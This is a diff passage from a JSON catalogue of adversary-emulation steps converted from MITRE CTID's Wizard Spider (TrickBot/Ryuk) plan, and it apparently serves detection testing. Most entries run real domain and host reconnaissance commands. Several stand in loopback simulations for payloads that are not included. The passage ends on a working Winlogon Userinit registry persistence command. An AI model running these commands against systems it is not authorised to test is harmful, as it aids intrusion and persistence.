+      "name": "CTID - Wizard Spider - T1105 - Download and Execute Agent for Lateral Movement (Toto)",
+      "description": "Downloads a new agent executable and executes it on the target host over RDP. This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself), since the RDP connection will be from the attacker's machine. Requires xdotool to be installed on the running machine. Morgana-native operational simulation used because: unresolved source facts: server; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "command-and-control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "1b21e49a-9550-4616-b125-d790a73165a6",
+        "source_order": 12,
+        "procedure_step": "4.A.3",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unresolved source facts: server",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unresolved source facts: server",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1082 - TrickBot System Information Discovery",
+      "name": "CTID - Wizard Spider - T1082 - TrickBot System Information Discovery",
+      "description": "Wizard Spider uses TrickBot to gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.",
+      "tactic": "discovery",
+      "tcode": "T1082",
+      "technique_name": "System Information Discovery",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "systeminfo > discovery.txt",
+      "cleanup_command": "del /f discovery.txt",
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "4750c01e-98fc-43f8-8178-14bcc66c2cc9",
+        "source_order": 13,
+        "procedure_step": "5.A.1",
+        "procedure_group": "procedure_discovery",
+        "cti_source": [
+          "https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/",
+          "https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf"
+        ],
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1007 - TrickBot System Service Discovery (systeminfo)",
+      "name": "CTID - Wizard Spider - T1007 - TrickBot System Service Discovery (systeminfo)",
+      "description": "Wizard Spider uses TrickBot to collect a list of installed programs and services on the system’s machine",
+      "tactic": "discovery",
+      "tcode": "T1007",
+      "technique_name": "System Service Discovery",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "sc query >> discovery.txt",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "dc4236df-0484-4763-891a-c2f6ede5293d",
+        "source_order": 14,
+        "procedure_step": "5.A.2",
+        "procedure_group": "procedure_discovery",
+        "cti_source": [
+          "https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/",
+          "https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf"
+        ],
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1087.001 - TrickBot Local Account Discovery",
+      "name": "CTID - Wizard Spider - T1087.001 - TrickBot Local Account Discovery",
+      "description": "Wizard Spider uses TrickBot to collect the local users of the system.",
+      "tactic": "discovery",
+      "tcode": "T1087.001",
+      "technique_name": "Account Discovery: Local Account",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "net user >> discovery.txt",
+      "cleanup_command": null,
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "53e87d17-b904-4739-92f0-4b5169d9a1d4",
+        "source_order": 15,
+        "procedure_step": "5.A.3",
+        "procedure_group": "procedure_discovery",
+        "cti_source": [
+          "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware",
+          "https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/",
+          "https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf"
+        ],
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1087.002 - TrickBot Domain Account Discovery",
+      "name": "CTID - Wizard Spider - T1087.002 - TrickBot Domain Account Discovery",
+      "description": "Wizard Spider uses TrickBot to collect the domain users of the system.",
+      "tactic": "discovery",
+      "tcode": "T1087.002",
+      "technique_name": "Account Discovery: Domain Account",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "net user /domain >> discovery.txt",
+      "cleanup_command": null,
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "e639caf1-8987-4aad-b6f1-6a1d186e2ec9",
+        "source_order": 16,
+        "procedure_step": "5.A.4",
+        "procedure_group": "procedure_discovery",
+        "cti_source": [
+          "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware",
+          "https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/"
+        ],
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1016 - TrickBot System Network Configuration Discovery",
+      "name": "CTID - Wizard Spider - T1016 - TrickBot System Network Configuration Discovery",
+      "description": "Wizard Spider uses TrickBot to obtain the IP address, location, and other relevant network information from the victim’s machine.",
+      "tactic": "discovery",
+      "tcode": "T1016",
+      "technique_name": "System Network Configuration Discovery",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "ipconfig /all",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "f6de05d2-5ec5-4d27-b19c-f8cf817d6213",
+        "source_order": 17,
+        "procedure_step": "5.A.5",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1049 - TrickBot System Network Connections Discovery",
+      "name": "CTID - Wizard Spider - T1049 - TrickBot System Network Connections Discovery",
+      "description": "Wizard Spider uses TrickBot to obtain the network connection information from the victim’s machine.",
+      "tactic": "discovery",
+      "tcode": "T1049",
+      "technique_name": "System Network Connections Discovery",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "netstat -tan",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "aa1b8eef-2c76-4184-b7a7-2b5c175e49f6",
+        "source_order": 18,
+        "procedure_step": "5.A.6",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1082 - TrickBot System Information Discovery (net config)",
+      "name": "CTID - Wizard Spider - T1082 - TrickBot System Information Discovery (net config)",
+      "description": "Wizard Spider uses TrickBot to gather client specfic information",
+      "tactic": "discovery",
+      "tcode": "T1082",
+      "technique_name": "System Information Discovery",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "net config workstation >> discovery.txt",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "1f30fdc6-88c0-4c69-958d-6101468bd0ec",
+        "source_order": 19,
+        "procedure_step": "5.A.7",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1482 - TrickBot Domain Trust Discovery",
+      "name": "CTID - Wizard Spider - T1482 - TrickBot Domain Trust Discovery",
+      "description": "Wizard Spider uses TrickBot to gather domain specfic information",
+      "tactic": "discovery",
+      "tcode": "T1482",
+      "technique_name": "Domain Trust Discovery",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "nltest /domain_trusts /all_trusts >> discovery.txt",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "ed40220d-9d1f-4191-b73f-54f17278e256",
+        "source_order": 20,
+        "procedure_step": "5.A.8",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1069 - TrickBot Permission Groups Discovery",
+      "name": "CTID - Wizard Spider - T1069 - TrickBot Permission Groups Discovery",
+      "description": "Wizard Spider uses TrickBot to identify the groups the user on a compromised host belongs to.",
+      "tactic": "discovery",
+      "tcode": "T1069",
+      "technique_name": "Permission Groups Discovery",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "whoami /groups >> discovery.txt",
+      "cleanup_command": null,
+      "operational_risk": "observe",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "ced2de73-54fa-49ec-b60d-de635dcde620",
+        "source_order": 21,
+        "procedure_step": "5.A.9",
+        "procedure_group": "procedure_discovery",
+        "cti_source": "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [],
+        "simulation_family": null,
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "ready",
+        "manual_reasons": [],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1558.003 - TrickBot Perform Kerberoasting",
+      "name": "CTID - Wizard Spider - T1558.003 - TrickBot Perform Kerberoasting",
+      "description": "Wizard Spider performs Kerberoasting using a public tool, Rubeus. Through Kerberoasting, Wizard Spider obtains encrypted credentials. Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "credential-access",
+      "tcode": "T1558.003",
+      "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Write-Output '[START] CTID simulation T1558.003'; $simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; New-Item -ItemType Directory -Path $simulationRoot -Force | Out-Null; $artifactPath = Join-Path $simulationRoot 'CTID-022-t1558-003.txt'; Set-Content $artifactPath 'credential_fixture=synthetic_value'; Select-String -Path $artifactPath -Pattern 'credential_fixture'; Write-Output '[SUCCESS] CTID simulation T1558.003 family=credential';",
+      "cleanup_command": "$simulationRoot = Join-Path $env:TEMP 'Morgana\\CTID'; Remove-Item $simulationRoot -Recurse -Force -ErrorAction SilentlyContinue; Remove-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'MorganaCTIDSimulation' -ErrorAction SilentlyContinue;",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "3de63509-4171-488f-8938-ce346677a5a6",
+        "source_order": 22,
+        "procedure_step": "6.A.1-2",
+        "procedure_group": "procedure_credential_access",
+        "cti_source": "https://thedfirreport.com/2020/10/08/ryuks-return/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "credential",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "rubeus.exe"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Second Target (Toto)",
+      "name": "CTID - Wizard Spider - T1021.001 - Terminate RDP Session to Second Target (Toto)",
+      "description": "End the RDP session to the second target. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection originates from the attacker's machine. Morgana-native operational simulation used because: unsupported source executor: proc.",
+      "tactic": "lateral-movement",
+      "tcode": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1021.001'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1021.001 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "dedb77a9-16b9-498c-bd07-074891abd345",
+        "source_order": 23,
+        "procedure_step": "6.A.2",
+        "procedure_group": "procedure_lateral_movement",
+        "cti_source": null,
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1105 - Prepare Tools for Ingress Tool Transfer (Wizard)",
+      "name": "CTID - Wizard Spider - T1105 - Prepare Tools for Ingress Tool Transfer (Wizard)",
+      "description": "Prepares the local folder with kill.bat, window.bat, and ryuk.exe to use as the RDP shared-drive. This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself), since the RDP connection will be from the attacker's machine. Requires xdotool to be installed on the running machine. Morgana-native operational simulation used because: required payloads are not approved for redistribution.",
+      "tactic": "command-and-control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "b8ad9654-80a1-4fde-b2d4-c0de7648621c",
+        "source_order": 24,
+        "procedure_step": "7.A.1",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "required payloads are not approved for redistribution"
+        ],
+        "source_payloads": [
+          "kill.bat",
+          "window.bat",
+          "ryuk.exe"
+        ],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1021.001 - Lateral Movement Via RDP (Wizard)",
+      "name": "CTID - Wizard Spider - T1021.001 - Lateral Movement Via RDP (Wizard)",
+      "description": "Uses discovered credentials to RDP into the domain controller. This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself), since the RDP connection must originate from the attacker's machine. Morgana-native operational simulation used because: unsupported source executor: proc; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "lateral-movement",
+      "tcode": "T1021.001",
+      "technique_name": "Remote Services: Remote Desktop Protocol",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1021.001'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; (timeout 1 sh -c 'echo CTID > /dev/tcp/127.0.0.1/22' 2>/dev/null || true); echo 'loopback remote-service probe completed'; echo '[SUCCESS] CTID simulation T1021.001 family=lateral'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "modify",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "6b9da996-145e-40b1-935f-6818a89bb561",
+        "source_order": 25,
+        "procedure_step": "7.A.1-2",
+        "procedure_group": "procedure_lateral_movement",
+        "cti_source": "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "lateral",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unsupported source executor: proc",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1105 - Download and Execute Agent for Lateral Movement (Wizard)",
+      "name": "CTID - Wizard Spider - T1105 - Download and Execute Agent for Lateral Movement (Wizard)",
+      "description": "Downloads a new agent executable and executes it on the domain controller over RDP. This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself), since the RDP connection will be from the attacker's machine. Requires xdotool to be installed on the running machine. Morgana-native operational simulation used because: unresolved source facts: server; source command depends on CALDERA, external C2, or implant primitives.",
+      "tactic": "command-and-control",
+      "tcode": "T1105",
+      "technique_name": "Ingress Tool Transfer",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "echo '[START] CTID simulation T1105'; simulation_root=/tmp/morgana-ctid; mkdir -p \"$simulation_root\"; python3 -c \"import socket,threading; s=socket.socket(); s.bind(('127.0.0.1',0)); s.listen(1); p=s.getsockname()[1]; threading.Thread(target=lambda: s.accept()[0].recv(64),daemon=True).start(); c=socket.create_connection(('127.0.0.1',p)); c.sendall(b'CTID network simulation'); c.close(); s.close(); print('loopback network telemetry',p)\"; echo '[SUCCESS] CTID simulation T1105 family=network'",
+      "cleanup_command": "rm -rf /tmp/morgana-ctid",
+      "operational_risk": "interact",
+      "source_metadata": {
+        "provider": "mitre-ctid",
+        "plan": "Wizard Spider",
+        "plan_type": "full-emulation",
+        "source_plan_id": "23ee980e-f0c5-4e88-a02c-56aa862b2c76",
+        "source_ability_id": "7a46a8c9-f46a-481b-8b38-68a3aea68114",
+        "source_order": 26,
+        "procedure_step": "7.A.3",
+        "procedure_group": "procedure_command_and_control",
+        "cti_source": "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/",
+        "source_path": "wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "source_documentation": "https://github.com/center-for-threat-informed-defense/adversary_emulation_library/blob/4467a6eed6e67d25009704130e1d27d1a8007f57/wizard_spider/Emulation_Plan/yaml/wizard_spider.yaml",
+        "simulation_reasons": [
+          "unresolved source facts: server",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "simulation_family": "network",
+        "source_commit": "4467a6eed6e67d25009704130e1d27d1a8007f57",
+        "conversion_status": "simulated",
+        "manual_reasons": [
+          "unresolved source facts: server",
+          "source command depends on CALDERA, external C2, or implant primitives"
+        ],
+        "source_payloads": [],
+        "source_requirements": [],
+        "classified_requirements": [],
+        "repeatable": null
+      }
+    },
+    {
+      "id": "CTID - Wizard Spider - T1547.004 - Wizard Spider Registry Persistence",
+      "name": "CTID - Wizard Spider - T1547.004 - Wizard Spider Registry Persistence",
+      "description": "Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.",
+      "tactic": "persistence",
+      "tcode": "T1547.004",
+      "technique_name": "Boot or Logon Autostart Execution: Winlogon Helper DLL",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "required_assets": [],
+      "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Userinit\" \"Userinit.exe, $env:AppData\\uxtheme.exe\" -Force",
